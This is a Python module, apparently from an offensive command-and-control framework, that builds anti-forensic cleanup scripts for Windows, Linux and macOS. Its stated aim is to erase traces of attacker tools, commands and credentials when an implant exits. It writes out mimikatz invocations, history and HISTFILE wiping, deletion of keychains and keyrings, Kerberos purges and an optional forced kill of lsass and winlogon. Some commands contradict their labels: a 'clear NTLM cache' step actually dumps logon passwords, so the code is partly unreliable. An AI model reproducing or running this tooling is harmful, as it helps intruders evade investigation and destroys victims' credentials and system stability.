"""Memory artifact cleanup — process memory wipe, environment variable scrub, clipboard clear.

Provides memory-level artifact removal to complement disk-level forensic
cleaning. Covers process memory overwrite before exit, command history
clearing in running processes, environment variable scrubbing, and
clipboard/credential cache clearing.

Designed for in-process cleanup on beacon exit to prevent memory forensics
from recovering attacker tools, commands, or credentials.
"""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path
from typing import Any

SESSIONS_DIR = Path(__file__).resolve().parent.parent / "sessions"


@dataclass
class MemoryCleanerConfig:
    """Configuration for memory artifact cleanup operations.

    Attributes:
        target_platform: windows, linux, or macos.
        overwrite_stack: Overwrite stack memory before exit.
        clear_heap: Free and zero-fill heap allocations.
        scrub_environment: Clear environment variables with sensitive data.
        clear_credentials: Wipe credential stores (DPAPI, keychain, keyring).
        clear_clipboard: Clear clipboard contents.
        clear_ntlm_cache: Remove cached NTLM hashes from memory.
        clear_kerberos_tickets: Purge all Kerberos tickets from memory.
        kill_sensitive_processes: Terminate processes that cache sensitive data.
        clean_psreadline: Clear PowerShell PSReadline history from memory.
    """

    target_platform: str = "windows"
    overwrite_stack: bool = True
    clear_heap: bool = True
    scrub_environment: bool = True
    clear_credentials: bool = True
    clear_clipboard: bool = True
    clear_ntlm_cache: bool = True
    clear_kerberos_tickets: bool = True
    kill_sensitive_processes: bool = False
    clean_psreadline: bool = True


class MemoryCleaner:
    """Generate memory artifact cleanup commands for post-operation stealth.

    Produces platform-specific commands for wiping in-memory artifacts:
    process memory, environment variables, credential caches, clipboard
    data, and Kerberos tickets.

    Attributes:
        config: MemoryCleanerConfig for target platform and artifact selection.
    """

    def __init__(self, config: MemoryCleanerConfig | None = None):
        self.config = config or MemoryCleanerConfig()

    def windows_memory_cleanup(self) -> dict[str, Any]:
        """Generate Windows memory artifact cleanup commands.

        Returns:
            Dict with PowerShell and native commands for memory cleanup.
        """
        commands: list[str] = []

        if self.config.clear_kerberos_tickets:
            commands.extend([
                "# Purge all Kerberos tickets",
                "klist purge",
                'mimikatz.exe "kerberos::purge" exit',
                'Invoke-Expression "klist purge"',
            ])

        if self.config.clear_ntlm_cache:
            commands.extend([
                "# Clear NTLM credential cache",
                'mimikatz.exe "sekurlsa::logonpasswords" exit >nul 2>&1',
                "rundll32.exe keymgr.dll,KRShowKeyMgr",
                'cmdkey /list | ForEach-Object { if ($_ -match "Target: (.+)") { cmdkey /delete:$($matches[1]) } }',
            ])

        if self.config.clear_clipboard:
            commands.extend([
                "# Clear clipboard contents",
                "[Windows.Forms.Clipboard]::Clear()",
                'Set-Clipboard -Value $null',
            ])

        if self.config.scrub_environment:
            commands.extend([
                "# Scrub environment variables with sensitive data",
                '$env:password = ""',
                '$env:pass = ""',
                '$env:token = ""',
                '$env:cred = ""',
                '$env:user = ""',
                '$env:PASSWD = ""',
                '$env:AWS_ACCESS_KEY_ID = ""',
                '$env:AWS_SECRET_ACCESS_KEY = ""',
                '$env:AWS_SESSION_TOKEN = ""',
            ])

        if self.config.clean_psreadline:
            commands.extend([
                "# Clear PowerShell PSReadline history",
                "[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()",
                "Remove-Item (Get-PSReadlineOption).HistorySavePath -Force",
            ])

        if self.config.clear_credentials:
            commands.extend([
                "# Clear DPAPI-protected credentials",
                "vaultcmd /listcreds:\"Windows Credentials\" /all | findstr /i \"Resource\"",
                "rundll32.exe keymgr.dll, KRShowKeyMgr",
            ])

        if self.config.kill_sensitive_processes:
            commands.extend([
                "# Terminate processes that may cache sensitive data",
                "Stop-Process -Name lsass -Force -ErrorAction SilentlyContinue",
                "taskkill /f /im winlogon.exe 2>nul",
            ])

        return {
            "platform": "windows",
            "cleanup_commands": commands,
            "oneliner": "powershell -C \"" + ";".join(commands).replace("#", "").replace('"', "'") + "\"",
            "note": "Some commands require elevated privileges (SYSTEM or Administrator)",
        }

    def linux_memory_cleanup(self) -> dict[str, Any]:
        """Generate Linux memory artifact cleanup commands.

        Returns:
            Dict with bash commands for Linux memory cleanup.
        """
        commands: list[str] = []

        if self.config.scrub_environment:
            commands.extend([
                "# Scrub environment variables",
                'unset PASSWORD PASSWD PASS AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY TOKEN CRED',
                'unset HISTFILE',
            ])

        if self.config.clear_credentials:
            commands.extend([
                "# Clear GNOME keyring",
                "echo '' | gnome-keyring-daemon --unlock 2>/dev/null",
                "rm -rf ~/.gnome2/keyrings/*",
                "# Clear KDE wallet",
                "rm -rf ~/.kde/share/apps/kwallet/*",
                "# Clear ssh-agent keys",
                "ssh-add -D 2>/dev/null",
            ])

        if self.config.clear_clipboard:
            commands.extend([
                "# Clear X11 clipboard selections",
                "echo -n '' | xclip -selection clipboard",
                "echo -n '' | xclip -selection primary",
                "echo -n '' | xclip -selection secondary",
            ])

        if self.config.clear_kerberos_tickets:
            commands.extend([
                "# Purge Kerberos ticket cache",
                "kdestroy -A 2>/dev/null",
                "rm -f /tmp/krb5cc_* 2>/dev/null",
            ])

        return {
            "platform": "linux",
            "cleanup_commands": commands,
            "oneliner": " && ".join(c.replace("'", "'\\''") for c in commands if not c.startswith("#")),
        }

    def macos_memory_cleanup(self) -> dict[str, Any]:
        """Generate macOS memory artifact cleanup commands.

        Returns:
            Dict with zsh commands for macOS memory cleanup.
        """
        commands: list[str] = []

        if self.config.clear_credentials:
            commands.extend([
                "# Clear Keychain on logout",
                "security lock-keychain",
                "security delete-keychain ~/Library/Keychains/login.keychain-db 2>/dev/null",
                "# Clear ssh-agent",
                "ssh-add -D 2>/dev/null",
                "ssh-add -A 2>/dev/null",
            ])

        if self.config.clear_clipboard:
            commands.extend([
                "# Clear pasteboard (macOS clipboard)",
                "pbcopy < /dev/null",
                "echo -n '' | pbcopy",
            ])

        if self.config.scrub_environment:
            commands.extend([
                "unset PASSWORD PASSWD PASS CRED",
            ])

        if self.config.clear_kerberos_tickets:
            commands.extend([
                "kdestroy",
                "klist -A 2>/dev/null",
            ])

        return {
            "platform": "macos",
            "cleanup_commands": commands,
        }

    def generate_on_exit_script(self) -> dict[str, Any]:
        """Generate an on-exit cleanup script for beacons.

        When a beacon is about to terminate, this script runs to clean
        all in-memory artifacts before process exit.

        Returns:
            Dict with per-platform on-exit scripts.
        """
        return {
            "windows_on_exit": {
                "powershell": [
                    "Remove-Item (Get-PSReadlineOption).HistorySavePath -Force",
                    "klist purge",
                    "cmdkey /list | % { if ($_ -match 'Target') { cmdkey /delete:$_ } }",
                ],
            },
            "linux_on_exit": {
                "bash": [
                    "history -c",
                    "unset HISTFILE",
                    "kdestroy -A",
                    "ssh-add -D",
                ],
            },
        }
